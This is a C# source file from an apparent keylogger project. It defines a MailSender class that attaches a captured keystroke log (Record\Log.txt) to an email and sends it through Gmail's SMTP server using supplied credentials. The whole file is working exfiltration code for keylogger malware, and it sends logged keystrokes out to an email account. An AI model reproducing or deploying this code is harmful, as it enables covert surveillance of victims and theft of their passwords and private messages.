using System;
using System.Net.Mail;

namespace KeyLogs
{
    class MailSender
    {
        public static void SendMail(string email, string password)
        {
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); //Modify for another email provider

            DateTime timeSent = DateTime.Now;

            string message = "Keylogger sent: ";
            message = String.Format(message + "{0:g}", timeSent); //Check custom formation in DateTime doc

            MailMessage mail = new MailMessage();

            mail.From = new MailAddress(email);
            mail.To.Add(email);
            mail.Subject = "Keylogger file";
            mail.Body = message;

            mail.Attachments.Add(new Attachment(".\\Record\\Log.txt"));

            client.UseDefaultCredentials = false;
            client.Credentials = new System.Net.NetworkCredential(email, password);
            client.EnableSsl = true; //gmail requires ssl

            try
            {
                client.Send(mail);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString()); //Used for originator to track any email problems
            }

            mail.Dispose(); //Free file use from MailMessage
        }
    }
}
